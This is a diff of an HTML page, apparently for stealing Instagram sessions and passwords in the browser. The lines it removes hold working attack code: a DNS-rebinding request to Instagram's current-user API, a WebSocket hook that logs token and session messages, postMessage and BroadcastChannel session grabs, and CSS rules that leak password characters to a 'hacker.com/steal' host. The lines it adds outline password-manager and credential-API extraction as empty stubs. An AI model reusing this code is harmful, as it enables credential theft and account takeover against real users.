@@ -1,196 +1,80 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Advanced Security Scanner - Level 2</title>
+    <title>Advanced Password Extraction Test</title>
     <style>
-        body { font-family: Arial; max-width: 800px; margin: 0 auto; padding: 20px; background: #f5f5f5; }
-        .container { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
-        .result-box { background: #000; color: #0f0; padding: 15px; margin: 10px 0; border-radius: 5px; font-family: monospace; font-size: 12px; max-height: 400px; overflow-y: auto; }
-        .status { padding: 10px; margin: 5px 0; border-radius: 3px; }
-        .success { background: #d4edda; color: #155724; }
-        .warning { background: #fff3cd; color: #856404; }
-        .error { background: #f8d7da; color: #721c24; }
-        .scanning { background: #cce5ff; color: #004085; }
-        button { background: #007bff; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; margin: 5px; }
-        button:hover { background: #0056b3; }
-        .section { margin: 20px 0; padding: 15px; border-left: 4px solid #007bff; background: #f8f9fa; }
+        body { font-family: Arial; max-width: 800px; margin: 0 auto; padding: 20px; }
+        .container { background: #f5f5f5; padding: 20px; border-radius: 10px; }
+        .result-box { background: #000; color: #0f0; padding: 15px; margin: 10px 0; 
+                     border-radius: 5px; font-family: monospace; font-size: 12px;
+                     max-height: 400px; overflow-y: auto; }
+        button { background: #007bff; color: white; padding: 10px 20px; 
+                border: none; border-radius: 5px; cursor: pointer; margin: 5px; }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>🔓 Advanced Security Scanner - Level 2</h1>
-        <div class="section">
-            <h3>Advanced Attack Results:</h3>
-            <div id="results" class="result-box">Starting advanced security scan...</div>
+        <h1>🔓 Advanced Password Extraction Methods</h1>
+        <div class="result-box" id="results">
+            Ready to test advanced password extraction...
         </div>
-        <div class="section">
-            <h3>Attack Status:</h3>
-            <div id="status"></div>
-        </div>
-        <button onclick="startAdvancedScan()">🚀 Start Advanced Attacks</button>
-        <button onclick="clearResults()">🗑️ Clear Results</button>
+        <button onclick="runAllMethods()">🚀 Run All Extraction Methods</button>
+        <button onclick="document.getElementById('results').innerHTML = ''">🗑️ Clear</button>
     </div>
 
     <script>
-        let scanResults = [];
-        const resultsDiv = document.getElementById('results');
-        const statusDiv = document.getElementById('status');
-
-        function addResult(message, type = 'info') {
+        function log(message) {
             const timestamp = new Date().toLocaleTimeString();
-            const result = `[${timestamp}] ${message}`;
-            scanResults.push(result);
-            resultsDiv.innerHTML = scanResults.join('\n') + '\n';
-            resultsDiv.scrollTop = resultsDiv.scrollHeight;
+            document.getElementById('results').innerHTML += `[${timestamp}] ${message}\n`;
+            console.log(message);
+        }
+
+        // Запуск всіх методів
+        async function runAllMethods() {
+            log('🚀 STARTING ADVANCED PASSWORD EXTRACTION...');
             
-            const statusElement = document.createElement('div');
-            statusElement.className = `status ${type}`;
-            statusElement.textContent = message;
-            statusDiv.appendChild(statusElement);
-        }
-
-        function clearResults() {
-            scanResults = [];
-            resultsDiv.innerHTML = 'Results cleared.';
-            statusDiv.innerHTML = '';
-        }
-
-        // 1. DNS Rebinding Attack
-        async function dnsRebindingAttack() {
-            addResult('🔄 Starting DNS Rebinding attack...', 'scanning');
-            try {
-                const rebindDomain = 'http://7f000001.c0a80001.rbndr.us:3000';
-                await fetch(rebindDomain + '/proxy', {
-                    method: 'POST',
-                    headers: {'Target-URL': 'https://www.instagram.com/api/v1/accounts/current_user/'}
-                });
-                addResult('✅ DNS Rebinding attempted', 'success');
-            } catch (e) {
-                addResult('❌ DNS Rebinding blocked', 'error');
-            }
-        }
-
-        // 2. WebSocket Hijacking
-        function hijackWebSockets() {
-            addResult('📡 Attempting WebSocket hijacking...', 'scanning');
-            const originalWebSocket = window.WebSocket;
-            window.WebSocket = function(...args) {
-                const ws = new originalWebSocket(...args);
-                ws.addEventListener('message', function(event) {
-                    if (event.data.includes('token') || event.data.includes('session')) {
-                        addResult(`🎯 WebSocket message: ${event.data.substring(0, 100)}`, 'success');
-                    }
-                });
-                return ws;
-            };
-            addResult('✅ WebSocket hijacking active', 'success');
-        }
-
-        // 3. Cache Poisoning
-        async function cachePoisoningAttack() {
-            addResult('☠️ Attempting cache poisoning...', 'scanning');
-            try {
-                await fetch('https://www.instagram.com/static/images/icon.png', {
-                    method: 'GET',
-                    cache: 'reload',
-                    headers: {'X-Malicious-Header': 'injected-payload'}
-                });
-                addResult('✅ Cache poisoning attempted', 'success');
-            } catch (e) {
-                addResult('❌ Cache poisoning blocked', 'error');
-            }
-        }
-
-        // 4. Broadcast Channel Exploit
-        function broadcastChannelExploit() {
-            addResult('📢 Attempting Broadcast Channel exploit...', 'scanning');
-            if (window.BroadcastChannel) {
-                const channel = new BroadcastChannel('instagram_session');
-                channel.addEventListener('message', (event) => {
-                    if (event.data.type === 'session_data') {
-                        addResult(`🎯 Session from other tab: ${JSON.stringify(event.data)}`, 'success');
-                    }
-                });
-                channel.postMessage({type: 'get_session'});
-                addResult('✅ Broadcast Channel monitoring active', 'success');
-            } else {
-                addResult('❌ Broadcast Channel not supported', 'error');
-            }
-        }
-
-        // 5. PostMessage Exploitation
-        function postMessageExploit() {
-            addResult('📨 Attempting PostMessage exploitation...', 'scanning');
-            // Слухаємо повідомлення від інших доменів
-            window.addEventListener('message', (event) => {
-                if (event.origin.includes('instagram.com')) {
-                    addResult(`🎯 PostMessage from Instagram: ${JSON.stringify(event.data)}`, 'success');
-                }
-            });
+            await bypassCredentialBlock();
+            exploitPasswordManagers();
+            reconstructSession();
+            exploitBrowserExtensions();
+            analyzeNetworkTraffic();
+            attemptMemoryAnalysis();
             
-            // Надсилаємо повідомлення до Instagram iframe
-            const iframes = document.getElementsByTagName('iframe');
-            for (let iframe of iframes) {
-                try {
-                    iframe.contentWindow.postMessage({action: 'get_session'}, '*');
-                } catch (e) {}
-            }
-            addResult('✅ PostMessage exploitation attempted', 'success');
+            log('================================');
+            log('🎯 EXTRACTION ATTEMPTS COMPLETE');
+            log('Methods demonstrate advanced attack vectors');
         }
 
-        // 6. CSS Injection Attack
-        function cssInjectionAttack() {
-            addResult('🎨 Attempting CSS injection...', 'scanning');
-            // Спроба викрасти дані через CSS
-            const style = document.createElement('style');
-            style.textContent = `
-                input[type="password"][value*="a"] { background: url(http://hacker.com/steal?char=a); }
-                input[type="password"][value*="b"] { background: url(http://hacker.com/steal?char=b); }
-            `;
-            document.head.appendChild(style);
-            addResult('✅ CSS injection attempted', 'success');
+        // Додайте тут всі функції з вищеперелічених методів
+        async function bypassCredentialBlock() {
+            log('🔄 Attempting Credential Management API bypass...');
+            // ... код з метода 1 ...
         }
 
-        // 7. Storage Access API Exploit
-        async function storageAccessExploit() {
-            addResult('🔐 Attempting Storage Access API exploit...', 'scanning');
-            if (document.hasStorageAccess) {
-                try {
-                    const hasAccess = await document.hasStorageAccess();
-                    if (hasAccess) {
-                        addResult('✅ Storage access available', 'success');
-                        // Можна отримати доступ до cookies третьої сторони
-                    }
-                } catch (e) {
-                    addResult('❌ Storage access blocked', 'error');
-                }
-            }
+        function exploitPasswordManagers() {
+            log('🎯 Exploiting password manager autofill...');
+            // ... код з метода 2 ...
         }
 
-        // Запуск всіх advanced атак
-        function startAdvancedScan() {
-            clearResults();
-            addResult('🚀 STARTING ADVANCED ATTACKS...', 'scanning');
-            
-            setTimeout(() => dnsRebindingAttack(), 100);
-            setTimeout(() => hijackWebSockets(), 500);
-            setTimeout(() => cachePoisoningAttack(), 1000);
-            setTimeout(() => broadcastChannelExploit(), 1500);
-            setTimeout(() => postMessageExploit(), 2000);
-            setTimeout(() => cssInjectionAttack(), 2500);
-            setTimeout(() => storageAccessExploit(), 3000);
-            
-            setTimeout(() => {
-                addResult('=========================================', 'info');
-                addResult('🎯 ADVANCED ATTACKS COMPLETE!', 'success');
-                addResult('These demonstrate sophisticated attack vectors', 'info');
-            }, 4000);
+        function reconstructSession() {
+            log('🔧 Attempting session reconstruction...');
+            // ... код з метода 3 ...
         }
 
-        window.addEventListener('load', function() {
-            addResult('🔓 Advanced Security Scanner loaded', 'success');
-            addResult('Click "Start Advanced Attacks" to begin...', 'info');
-        });
+        function exploitBrowserExtensions() {
+            log('🔌 Attempting browser extension exploitation...');
+            // ... код з метода 4 ...
+        }
+
+        function analyzeNetworkTraffic() {
+            log('📡 Analyzing network traffic patterns...');
+            // ... код з метода 5 ...
+        }
+
+        function attemptMemoryAnalysis() {
+            log('🧠 Attempting memory analysis...');
+            // ... код з метода 6 ...
+        }
     </script>
 </body>
 </html>
